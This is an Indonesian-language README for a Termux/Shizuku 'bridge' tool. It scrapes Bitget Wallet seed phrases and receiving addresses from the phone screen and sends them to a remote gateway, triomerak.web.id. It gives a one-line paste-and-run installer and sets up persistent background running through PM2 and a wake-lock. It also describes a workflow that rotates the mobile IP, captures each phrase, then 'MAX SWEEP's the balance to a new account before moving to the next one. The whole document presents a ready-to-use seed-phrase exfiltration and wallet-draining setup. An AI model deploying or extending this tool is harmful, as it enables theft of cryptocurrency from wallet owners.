# 🌉 Trio Merak - Shizuku Bridge for Android (Termux)

Jembatan otomatisasi **Shizuku (`rish`)** di HP Android untuk mengekstrak **12/24 Kata Seed Phrase** dan mendeteksi **Alamat Barcode Penerima (`0x...`)** Bitget Wallet, lalu mengirimkannya secara instan dan aman ke Web Server Gateway lewat **Internet Seluler (Data Mobile)**.

Secara default **berjalan otomatis 24/7 di latar belakang menggunakan PM2 Process Manager**, sehingga Termux dapat di-minimize atau layar HP dimatikan tanpa menghentikan automasi. Terhubung langsung ke website gateway resmi **`https://triomerak.web.id`**.

---

## ⚡ 1 Perintah Langsung Jadi (All-in-One Setup)

Cukup salin dan tempel perintah ini di terminal **Termux** Anda:

```bash
pkg update -y && pkg install -y git python && git clone https://github.com/Imammaulidy/bridge.git && cd bridge && bash run.sh
```

> [!TIP]
> **Menu Interaktif**: Perintah `bash run.sh` akan membuka **menu interaktif lengkap** dengan 8 pilihan:
> - **[1] ALL-IN-ONE** → Auto install semua dependensi + jalankan PM2 24/7
> - **[2] Ubah Target Server** → Ganti URL gateway (default: triomerak.web.id)
> - **[3] Status PM2** → Cek status bridge
> - **[4] Log Realtime** → Pantau aktivitas
> - **[5] Restart Bridge**
> - **[6] Stop Bridge**
> - **[7] Trigger Manual Extract**
> - **[8] Test Koneksi Shizuku**

---

## 🚀 Mode All-in-One (Pilihan Menu #1)

Ketika Anda memilih **[1] ALL-IN-ONE**, sistem otomatis:

✅ **Auto-Install Dependensi**:
- Python (jika belum ada)
- Node.js (jika belum ada)
- PM2 Process Manager (jika belum ada)

✅ **Setup Otomatis**:
- Konfigurasi storage Termux (`termux-setup-storage`)
- Salin binary `rish` dari Shizuku
- Setup environment variable `RISH_APPLICATION_ID`
- Test koneksi Shizuku

✅ **Launch PM2 24/7**:
- Aktifkan `termux-wake-lock` (CPU tidak sleep)
- Jalankan bridge di background via PM2
- Auto-save PM2 state (restart otomatis setelah reboot HP)

**Setelah selesai, bridge aktif 24/7 dan HP dapat di-minimize atau layar dimatikan!**

---

## 🔄 Reset & Update Bersih (Jika Git Pull Nyangkut / Error)

Jika update mengalami kendala, file bentrok (*merge conflict*), atau perintah `git pull origin main` nyangkut di Termux, **gunakan 1 baris perintah ini untuk menghentikan proses, menghapus direktori `bridge` lama secara tuntas, dan clone ulang**:

```bash
pm2 delete bridge 2>/dev/null; cd ~ && rm -rf bridge && git clone https://github.com/Imammaulidy/bridge.git && cd bridge && bash run.sh
```

> [!NOTE]
> Perintah di atas akan membersihkan seluruh file lama tanpa sisa, mengunduh versi terbaru yang 100% segar dari GitHub, dan langsung membuka menu interaktif.

---

## 🎮 Cara Penggunaan & Shortcut Ekstraksi

Setelah menjalankan via menu **[1] ALL-IN-ONE**, sistem sudah aktif di background. Anda memiliki 3 cara praktis untuk mengekstrak:

### 1️⃣ Tekan Tombol Fisik [VOLUME ATAS] atau [VOLUME BAWAH] di HP:
* **Tidak perlu menyentuh terminal Termux sama sekali!**
* Cukup buka aplikasi **Bitget Wallet** pada layar 12 kata phrase.
* Tekan salah satu tombol fisik: **Volume Up** atau **Volume Down** di bodi samping HP Anda.
* Bridge otomatis mendeteksi tombol fisik, menghitung mundur **3 detik** (memberikan jeda agar layar phrase tampil penuh), lalu memindai dan mengirimkan kata phrase ke Web Server!

### 2️⃣ Tekan [ENTER] di Termux:
* Buka Termux, tekan **Enter**.
* Countdown **4 detik** akan berjalan, lalu mengekstrak layar HP seketika.
* Atau gunakan menu **[7] Trigger Manual Extract**

### 3️⃣ Klik Tombol di Web POS Kasir (Instan 0 Detik):
* Jika Anda menekan tombol **`⚡ Ambil Phrase dari HP`** di halaman Web POS Kasir, server akan memanggil HP Anda dan mengekstrak layar **langsung tanpa jeda/timer**.

---

## 📱 Persiapan Awal (Hanya Sekali)

### 1. Install Aplikasi Termux
Unduh dari **[F-Droid](https://f-droid.org/en/packages/com.termux/)** atau **[GitHub Releases](https://github.com/termux/termux-app/releases)**.  
⚠️ **Jangan gunakan Termux dari Google Play Store** (versi usang).

### 2. Install & Aktifkan Shizuku
- Download **Shizuku** dari **[GitHub](https://github.com/RikkaApps/Shizuku/releases)** atau Play Store
- Buka aplikasi Shizuku
- Tap tombol **"Start"** (Shizuku is running)
- Masuk ke menu **"Authorized applications"**
- Centang **Termux** untuk memberikan izin

### 3. Salin Binary Rish (Otomatis via Menu)
Menu **[1] ALL-IN-ONE** sudah otomatis menyalin file `rish`.  
Atau manual:
```bash
termux-setup-storage
cp /sdcard/Android/data/moe.shizuku.privileged.api/files/rish* $PREFIX/bin/
chmod +x $PREFIX/bin/rish
```

### 4. Test Koneksi Shizuku
Gunakan menu **[8] Test Koneksi Shizuku** atau manual:
```bash
rish -c id
```
*(Output: `uid=2000` = Shizuku aktif 100%)*

---

## 🎛️ Menu Interaktif Lengkap

```bash
bash run.sh
```

**Pilihan Menu:**

| No | Menu | Fungsi |
|----|------|--------|
| **1** | 🎯 ALL-IN-ONE | Auto setup dependensi + jalankan PM2 24/7 |
| **2** | 📡 Ubah Target Server | Ganti URL gateway (default: triomerak.web.id) |
| **3** | 📊 Status & Monitor PM2 | Lihat status bridge (online/offline) |
| **4** | 📜 Lihat Log Realtime | Streaming log aktivitas bridge |
| **5** | 🔄 Restart Bridge | Restart proses PM2 |
| **6** | ⏹️  Stop Bridge | Hentikan proses PM2 |
| **7** | ⚡ Trigger Manual Extract | Ekstrak layar manual via file trigger |
| **8** | 🔍 Test Koneksi Shizuku | Verifikasi Shizuku + UIAutomator |
| **0** | 🚪 Keluar | Exit menu (bridge tetap jalan di background) |

---

## ⚡ Quick Commands (Tanpa Menu)

Selain menu interaktif, Anda juga bisa langsung:

```bash
bash run.sh --status     # Cek status PM2
bash run.sh --logs       # Lihat log realtime
bash run.sh --restart    # Restart bridge
bash run.sh --stop       # Stop bridge
bash run.sh --trigger    # Trigger extract manual
```

Atau langsung via PM2:
```bash
pm2 status               # Status bridge
pm2 logs bridge          # Log realtime (Ctrl+C keluar)
pm2 restart bridge       # Restart
pm2 stop bridge          # Stop
```

---

## 🌐 Ubah Target Server Gateway

**Default**: Bridge otomatis terhubung ke `https://triomerak.web.id`

**Cara Ubah**:
1. Jalankan menu interaktif: `bash run.sh`
2. Pilih **[2] Ubah Target Server**
3. Masukkan URL baru (contoh: `http://192.168.1.100:5000` atau `https://domain-anda.com`)
4. Restart bridge agar perubahan diterapkan

Server tersimpan permanen di `~/.merak_bridge_config.json`

---

## 🐛 Debug Mode (Verbose Logging)

Untuk troubleshooting detail, aktifkan debug mode:

```bash
export BRIDGE_DEBUG=1
pm2 restart bridge
pm2 logs bridge
```

**Debug mode menampilkan**:
- Semua text node XML yang terdeteksi
- Format parsing yang digunakan (1, 2, 3, atau 4)
- Kata-kata kandidat sebelum filtering
- Statistik per tahap parsing
- XML dump tersimpan di `~/last_dump.xml`

---

## ✈️ Alur Garap Mode Pesawat (Anti-Putus)

1. Nyalakan **Mode Pesawat** → Tunggu 3 detik → Matikan **Mode Pesawat** (IP seluler berganti).
2. Buka aplikasi Bitget Wallet pada halaman 12 kata.
3. Tekan tombol **Volume Atas / Bawah** di HP Anda.
4. Timer 3 detik berjalan → Bridge membaca layar dan otomatis retry saat data seluler pulih → Phrase sukses terkirim ke Web POS!
5. Klik **`⚡ MAX SWEEP`** di Web POS → Saldo lunas berpindah ke akun baru!
6. Siap untuk akun berikutnya!

---

## 🔧 Troubleshooting

### ❌ "Tidak ditemukan 12 kata di layar"
**Solusi**:
1. Pastikan aplikasi **Bitget Wallet** terbuka (bukan Termux)
2. Navigasi ke: **Menu → Settings → Security → Backup Wallet**
3. Verifikasi PIN/Password untuk melihat 12 kata
4. Pastikan **semua 12 kata terlihat** di layar (scroll jika perlu)
5. Jangan ada dialog/popup yang menutupi kata-kata

### ❌ "Shizuku belum aktif"
**Solusi**:
1. Buka aplikasi **Shizuku** → Pastikan status **"Shizuku is running"** (hijau)
2. Menu **"Authorized applications"** → Centang **Termux**
3. Copy binary: `cp /sdcard/Android/data/moe.shizuku.privileged.api/files/rish* $PREFIX/bin/`
4. Test: `rish -c id` (harus muncul `uid=2000`)

### ❌ "Bridge tidak jalan setelah restart HP"
**Solusi**:
```bash
pm2 resurrect    # Restore state terakhir
pm2 startup      # Enable auto-start
pm2 save         # Save current state
```

### 🔍 Inspect XML Dump (Advanced)
Jika ekstraksi terus gagal, periksa XML langsung:
1. Klik **"🔍 Lihat Raw XML Debug"** di Web POS (setelah gagal extract)
2. Atau manual: `cat ~/last_dump.xml` di Termux
3. Cari kata-kata seed phrase di XML untuk debugging

---

## 📁 Struktur Repositori Bersih

```text
bridge/
├── bridge.py            # 🐍 Script Bridge Client Shizuku (Main Engine)
├── ecosystem.config.js  # ⚙️ Konfigurasi PM2 Process Manager
├── run.sh               # 🚀 Interactive Menu + All-in-One Installer
├── README.md            # 📖 Dokumentasi Lengkap
└── .gitignore           # 🔒 Proteksi File Konfigurasi Lokal
```

---

## 🆕 Changelog v2.1

**Update Terbaru** (Des 2024):
- ✅ **DEBUG MODE** - `export BRIDGE_DEBUG=1` untuk verbose logging
- ✅ **XML Auto-Save** - Dump tersimpan di `~/last_dump.xml`
- ✅ **Enhanced Parser**:
  - Handle uppercase & mixed case (Apple → apple)
  - Auto-remove punctuation (wallet, → wallet)
  - Min word length 3 chars (mengurangi noise)
  - Avoid duplicate words
  - Fallback 10-14 atau 22-26 kata
- ✅ **Better Error Messages**:
  - Statistik XML size & word count
  - Deteksi foreground app
  - Troubleshooting tips spesifik
  - XML dump location info
- ✅ **Expanded Filter** - 70+ kata UI Bitget/Android

**Changelog v2.0** (Nov 2024):
- ✅ Menu interaktif 8 pilihan
- ✅ All-in-one auto installer
- ✅ Ubah target server via menu
- ✅ Test koneksi Shizuku built-in
- ✅ Quick commands (`--status`, `--logs`, dll)
- ✅ 4 strategi parsing seed phrase

---

## 📞 Support & Issues

- **GitHub Issues**: [https://github.com/Imammaulidy/bridge/issues](https://github.com/Imammaulidy/bridge/issues)
- **Main Gateway**: [https://triomerak.web.id](https://triomerak.web.id)

---

**© 2024 Trio Merak - All Rights Reserved**
